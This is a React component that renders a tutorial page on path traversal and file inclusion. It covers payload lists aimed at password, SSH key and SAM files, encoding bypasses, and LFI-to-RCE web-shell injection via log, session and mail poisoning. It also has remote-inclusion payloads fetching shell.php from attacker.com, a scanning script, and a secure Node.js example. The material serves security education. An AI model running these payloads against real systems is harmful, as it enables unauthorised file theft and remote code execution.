
import React from 'react';
import { File } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const PathTraversal: React.FC = () => {
  return (
    <section id="file-traversal" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">File Inclusion/Path Traversal</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            Path traversal (also known as directory traversal) attacks exploit insufficient input validation to 
            access files and directories stored outside the intended directory. By manipulating variables that 
            reference files with "dot-dot-slash (../)" sequences and variations, attackers can access arbitrary files
            on the server filesystem. This vulnerability can lead to unauthorized access to sensitive configuration files,
            source code, system files, and potentially remote code execution.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Access sensitive files outside the web root directory, including configuration files, source code, 
              system files, user data, and potentially execute arbitrary code through file inclusion techniques.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Mechanics */}
        <div>
          <h4 className="text-xl font-semibold mb-4">How Path Traversal Works</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
            <h5 className="font-semibold mb-2">Attack Mechanism:</h5>
            <p className="text-sm mb-3">
              Path traversal attacks manipulate file path parameters to break out of the intended directory structure.
              The fundamental technique involves using relative path sequences like "../" to navigate up the directory tree
              and access files in parent directories.
            </p>
            
            <h6 className="font-medium mb-2">Common Attack Patterns:</h6>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li><strong>../</strong> - Standard directory traversal sequence</li>
              <li><strong>..\\</strong> - Windows-style directory traversal</li>
              <li><strong>..%2f</strong> - URL-encoded forward slash</li>
              <li><strong>..%5c</strong> - URL-encoded backslash</li>
              <li><strong>%2e%2e%2f</strong> - Double URL-encoded traversal</li>
              <li><strong>....//</strong> - Double slash bypass</li>
              <li><strong>..;/</strong> - Semicolon bypass for some filters</li>
            </ul>
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="File Download Functions"
              description="Features that allow users to download files by specifying filenames or paths, often found in document management systems."
              severity="high"
            />
            <SecurityCard
              title="File Upload Handlers"
              description="Upload functionality that processes file paths or allows specification of upload directories without proper validation."
              severity="high"
            />
            <SecurityCard
              title="Include/Require Statements"
              description="Dynamic file inclusion in scripting languages where user input influences which files are included or executed."
              severity="critical"
            />
            <SecurityCard
              title="Image/Media Servers"
              description="Applications that serve images or media files based on user-provided paths or filenames."
              severity="medium"
            />
          </div>
        </div>

        {/* Types of Path Traversal */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of Path Traversal Attacks</h4>
          <Tabs defaultValue="basic">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="basic">Basic Traversal</TabsTrigger>
              <TabsTrigger value="encoded">Encoded Traversal</TabsTrigger>
              <TabsTrigger value="lfi">Local File Inclusion</TabsTrigger>
              <TabsTrigger value="rfi">Remote File Inclusion</TabsTrigger>
            </TabsList>
            
            <TabsContent value="basic" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Basic Directory Traversal</h5>
                  <p className="text-sm mb-3">
                    The simplest form of path traversal using standard "../" sequences to navigate up directory levels
                    and access files outside the intended directory structure.
                  </p>
                  
                  <h6 className="font-medium mb-2">Common Target Files:</h6>
                  <CodeExample
                    language="bash"
                    title="Common Target Files (Linux/Unix)"
                    code={`# System configuration files
../../../etc/passwd          # User account information
../../../etc/shadow          # Encrypted passwords (requires root)
../../../etc/hosts           # Host name resolution
../../../etc/hostname        # System hostname
../../../etc/issue           # System identification
../../../proc/version        # Kernel version information
../../../proc/cmdline        # Kernel command line
../../../proc/cpuinfo        # CPU information

# Web server files
../../../var/log/apache2/access.log    # Apache access logs
../../../var/log/apache2/error.log     # Apache error logs
../../../etc/apache2/apache2.conf      # Apache configuration
../../../etc/nginx/nginx.conf          # Nginx configuration
../../../var/www/html/.htaccess        # Apache .htaccess files

# Application files
../../../var/log/syslog      # System logs
../../../home/user/.ssh/id_rsa         # SSH private keys
../../../home/user/.bash_history       # Command history`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Windows Target Files:</h6>
                  <CodeExample
                    language="bash"
                    title="Common Target Files (Windows)"
                    code={`# System files
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
..\\..\\..\\windows\\system32\\config\\sam
..\\..\\..\\windows\\system32\\config\\system
..\\..\\..\\windows\\win.ini
..\\..\\..\\windows\\boot.ini

# IIS logs and configuration
..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\
..\\..\\..\\windows\\system32\\inetsrv\\config\\

# Application data
..\\..\\..\\program files\\application\\config.xml
..\\..\\..\\users\\administrator\\desktop\\`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="encoded" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Encoded Path Traversal</h5>
                  <p className="text-sm mb-3">
                    When basic traversal sequences are filtered, attackers use various encoding techniques
                    to bypass input validation and filtering mechanisms.
                  </p>
                  
                  <h6 className="font-medium mb-2">Encoding Bypass Techniques:</h6>
                  <CodeExample
                    language="bash"
                    title="Encoding Bypass Examples"
                    code={`# URL Encoding
%2e%2e%2f          # ../
%2e%2e%5c          # ..\
%252e%252e%252f    # Double URL encoding

# Unicode Encoding
%c0%ae%c0%ae%c0%af  # ../
%c1%9c              # \

# UTF-8 Encoding
..%c0%af           # ../
..%c1%9c           # ..\

# Overlong UTF-8
%e0%80%ae%e0%80%ae%e0%80%af  # ../

# 16-bit Unicode
%u002e%u002e%u002f           # ../
%u002e%u002e%u005c           # ..\

# Filter Bypass Techniques
....//             # Double dots with double slash
..;/               # Semicolon injection
..%00/             # Null byte injection (older systems)
../               # Mixed case
..\\/              # Mixed separators`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Start with basic "../" patterns</li>
                    <li>Try different path separators (/, \)</li>
                    <li>Apply URL encoding to bypass filters</li>
                    <li>Test double encoding if single encoding fails</li>
                    <li>Try Unicode and UTF-8 variations</li>
                    <li>Combine techniques for complex bypasses</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="lfi" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Local File Inclusion (LFI)</h5>
                  <p className="text-sm mb-3">
                    LFI occurs when applications dynamically include files based on user input. This can lead to
                    code execution if attackers can include executable files or use techniques like log poisoning.
                  </p>
                  
                  <h6 className="font-medium mb-2">LFI Attack Examples:</h6>
                  <CodeExample
                    language="php"
                    title="Vulnerable PHP Code"
                    code={`<?php
// Vulnerable file inclusion
$page = $_GET['page'];
include("/var/www/pages/" . $page . ".php");

// Attacker input: ../../etc/passwd%00
// Resulting include: /var/www/pages/../../etc/passwd\0.php
// The null byte truncates the .php extension

// Another vulnerable example
$template = $_POST['template'];
include($template);

// Direct inclusion without path validation
if (isset($_GET['file'])) {
    include($_GET['file']);
}
?>`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">LFI to RCE Techniques:</h6>
                  <CodeExample
                    language="bash"
                    title="LFI to Remote Code Execution"
                    code={`# Log Poisoning via User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
# Then include the log file
http://target.com/page.php?file=../../var/log/apache2/access.log&cmd=id

# Log Poisoning via SSH
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# Then include auth.log
http://target.com/page.php?file=../../var/log/auth.log&cmd=whoami

# PHP Session Poisoning
# First, set a malicious session value
curl -c cookies.txt "http://target.com/session.php?data=<?php system(\$_GET['cmd']); ?>"
# Then include the session file
curl -b cookies.txt "http://target.com/lfi.php?file=../../tmp/sess_[session_id]&cmd=id"

# /proc/self/environ poisoning
# Inject code via HTTP headers, then include environ
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
http://target.com/lfi.php?file=../../proc/self/environ&cmd=ls

# Email poisoning (if mail logs are accessible)
mail -s "<?php system(\$_GET['cmd']); ?>" user@target.com
http://target.com/lfi.php?file=../../var/mail/user&cmd=uname`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="rfi" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Remote File Inclusion (RFI)</h5>
                  <p className="text-sm mb-3">
                    RFI allows attackers to include files from remote servers, often leading to immediate code execution.
                    This occurs when applications include files via URLs without proper validation.
                  </p>
                  
                  <h6 className="font-medium mb-2">RFI Attack Examples:</h6>
                  <CodeExample
                    language="php"
                    title="Vulnerable RFI Code"
                    code={`<?php
// Vulnerable to RFI if allow_url_include is enabled
$page = $_GET['page'];
include($page . ".php");

// Attacker can include remote files:
// http://target.com/index.php?page=http://attacker.com/shell

// Another vulnerable pattern
$config = $_GET['config'];
require_once($config);
?>`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">RFI Exploitation:</h6>
                  <CodeExample
                    language="bash"
                    title="RFI Attack Scenarios"
                    code={`# Basic RFI
http://target.com/index.php?file=http://attacker.com/shell.php

# RFI with null byte (older PHP versions)
http://target.com/index.php?file=http://attacker.com/shell.php%00

# Using data:// wrapper
http://target.com/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Using php:// wrapper
http://target.com/index.php?file=php://input
# Send PHP code in POST data

# FTP RFI (if FTP wrapper is enabled)
http://target.com/index.php?file=ftp://attacker.com/shell.php

# SMB RFI (Windows)
http://target.com/index.php?file=\\\\attacker.com\\share\\shell.php`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Prerequisites for RFI:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>allow_url_include = On (PHP configuration)</li>
                    <li>allow_url_fopen = On (usually enabled by default)</li>
                    <li>Network access from target to attacker server</li>
                    <li>No proper input validation on file parameter</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Step-by-Step Testing Guide */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Path Traversal Testing</h4>
          <Tabs defaultValue="discovery">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="discovery">Discovery</TabsTrigger>
              <TabsTrigger value="enumeration">Enumeration</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="escalation">Escalation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="discovery" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Identify Potential Entry Points</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">What to Look For:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>File download links and functions</li>
                    <li>Image gallery or media serving functionality</li>
                    <li>Document viewers or file readers</li>
                    <li>Template or theme selection features</li>
                    <li>Export/import functionality</li>
                    <li>File upload with path specification</li>
                    <li>Any parameter that might reference a file path</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Parameter Identification:</h6>
                  <CodeExample
                    language="bash"
                    title="Common Vulnerable Parameters"
                    code={`# URL parameters to test
?file=
?path=
?page=
?template=
?include=
?document=
?filename=
?dir=
?folder=
?location=
?config=

# Example vulnerable URLs
http://target.com/download.php?file=document.pdf
http://target.com/gallery.php?image=photo.jpg
http://target.com/viewer.php?document=report.doc
http://target.com/index.php?page=home
http://target.com/admin.php?config=settings.ini`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="enumeration" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Test for Path Traversal</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Start with basic traversal patterns</li>
                    <li>Gradually increase directory levels</li>
                    <li>Try different path separators</li>
                    <li>Apply encoding if basic patterns fail</li>
                    <li>Test for null byte injection</li>
                    <li>Try absolute paths</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Systematic Testing:</h6>
                  <CodeExample
                    language="bash"
                    title="Progressive Testing Approach"
                    code={`# Start with single directory traversal
../etc/passwd
..\windows\win.ini

# Increase traversal depth
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd

# Try different separators
..\/..\/..\/etc/passwd
..\/..\/..\etc\passwd

# URL encoding
%2e%2e%2fetc%2fpasswd
%2e%2e%5cetc%5cpasswd

# Double encoding
%252e%252e%252fetc%252fpasswd

# Null byte (older systems)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# Absolute paths
/etc/passwd
C:\windows\win.ini
file:///etc/passwd`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Exploit and Extract Information</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Automated Testing Script:</h6>
                  <CodeExample
                    language="python"
                    title="Path Traversal Testing Script"
                    code={`#!/usr/bin/env python3
import requests
import sys

def test_path_traversal(base_url, param, wordlist):
    """Test for path traversal vulnerabilities"""
    
    # Common payloads
    payloads = [
        "../etc/passwd",
        "../../etc/passwd", 
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..\\windows\\win.ini",
        "..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5cwindows%5cwin.ini",
        "....//etc/passwd",
        "..;/etc/passwd",
        "/etc/passwd",
        "C:\\windows\\win.ini"
    ]
    
    # Test each payload
    for payload in payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            response = requests.get(url, timeout=10)
            
            # Check for successful file access
            if "root:" in response.text or "bin:" in response.text:
                print(f"[+] Linux file access: {payload}")
                print(f"[+] URL: {url}")
                
            if "[fonts]" in response.text or "MSDOS" in response.text:
                print(f"[+] Windows file access: {payload}")
                print(f"[+] URL: {url}")
                
        except requests.RequestException as e:
            print(f"[-] Error testing {payload}: {e}")

# Usage
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 path_traversal.py <url> <parameter>")
        sys.exit(1)
        
    base_url = sys.argv[1]
    param = sys.argv[2]
    
    test_path_traversal(base_url, param, None)`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="escalation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Escalate to Code Execution</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">LFI to RCE Techniques:</h6>
                  <CodeExample
                    language="bash"
                    title="Escalation Techniques"
                    code={`# 1. Log Poisoning
# Poison Apache access log via User-Agent
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target.com/any-page
# Include the log file
http://target.com/lfi.php?file=../../../var/log/apache2/access.log&c=id

# 2. SSH Log Poisoning  
ssh '<?php system(\$_GET["c"]); ?>'@target.com
http://target.com/lfi.php?file=../../../var/log/auth.log&c=whoami

# 3. Email Log Poisoning
telnet target.com 25
HELO attacker.com
MAIL FROM: <?php system(\$_GET['c']); ?>
# Include mail log
http://target.com/lfi.php?file=../../../var/log/mail.log&c=ls

# 4. Session Poisoning
# Create session with malicious data
curl -c cookie.txt "http://target.com/login.php" -d "user=<?php system(\$_GET['c']); ?>"
# Include session file
http://target.com/lfi.php?file=../../../tmp/sess_[SESSIONID]&c=uname

# 5. Upload + LFI
# Upload file with PHP code (rename to .jpg if needed)
# Then include via LFI
http://target.com/lfi.php?file=../uploads/malicious.jpg&c=id`}
                  />
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Prevention Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Path Traversal Prevention</h4>
          <CodeExample
            language="javascript"
            title="Secure File Handling Implementation"
            code={`// Node.js secure file serving
const express = require('express');
const path = require('path');
const fs = require('fs').promises;

const app = express();

// Secure file download endpoint
app.get('/download/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    
    // 1. Whitelist allowed file extensions
    const allowedExtensions = ['.pdf', '.jpg', '.png', '.txt'];
    const ext = path.extname(filename).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
      return res.status(400).json({ error: 'File type not allowed' });
    }
    
    // 2. Sanitize filename - remove path traversal sequences
    const sanitizedFilename = path.basename(filename);
    
    // 3. Define safe directory
    const safeDirectory = path.resolve(__dirname, 'public/downloads');
    
    // 4. Construct full path
    const filePath = path.join(safeDirectory, sanitizedFilename);
    
    // 5. Verify the resolved path is within safe directory
    if (!filePath.startsWith(safeDirectory)) {
      return res.status(403).json({ error: 'Access denied' });
    }
    
    // 6. Check if file exists and is accessible
    try {
      await fs.access(filePath);
      const stats = await fs.stat(filePath);
      
      if (!stats.isFile()) {
        return res.status(404).json({ error: 'File not found' });
      }
    } catch (err) {
      return res.status(404).json({ error: 'File not found' });
    }
    
    // 7. Serve file securely
    res.sendFile(filePath);
    
  } catch (error) {
    console.error('File download error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Alternative approach using whitelist
const ALLOWED_FILES = new Set([
  'document1.pdf',
  'report.xlsx', 
  'image.jpg'
]);

app.get('/secure-download/:filename', (req, res) => {
  const filename = req.params.filename;
  
  // Only allow files in whitelist
  if (!ALLOWED_FILES.has(filename)) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  const filePath = path.join(__dirname, 'secure-files', filename);
  res.sendFile(filePath);
});`}
          />
        </div>

        {/* Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Path Traversal Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Scanners</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite:</strong> Active scanner with path traversal detection</li>
                <li><strong>OWASP ZAP:</strong> Path traversal scanning capability</li>
                <li><strong>Nikto:</strong> Web server scanner with traversal checks</li>
                <li><strong>dotdotpwn:</strong> Specialized directory traversal fuzzer</li>
                <li><strong>Nuclei:</strong> Templates for path traversal detection</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>curl:</strong> Command-line testing of endpoints</li>
                <li><strong>Ffuf:</strong> Fast web fuzzer for parameter testing</li>
                <li><strong>wfuzz:</strong> Web application fuzzer</li>
                <li><strong>Burp Intruder:</strong> Manual payload testing</li>
                <li><strong>Custom Scripts:</strong> Python/Bash automation</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Environment Considerations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <h5 className="font-semibold mb-2">Platform Differences</h5>
            <ul className="list-disc pl-6 space-y-2 text-sm">
              <li><strong>Windows:</strong> Uses backslashes (\), case-insensitive filenames, different system paths</li>
              <li><strong>Linux/Unix:</strong> Forward slashes (/), case-sensitive, different system file locations</li>
              <li><strong>PHP:</strong> Null byte truncation (older versions), magic_quotes, open_basedir restrictions</li>
              <li><strong>ASP.NET:</strong> Different file handling, security restrictions in newer versions</li>
              <li><strong>Java:</strong> File system abstractions, security manager restrictions</li>
              <li><strong>Node.js:</strong> Path module behavior, async file operations</li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};

export default PathTraversal;
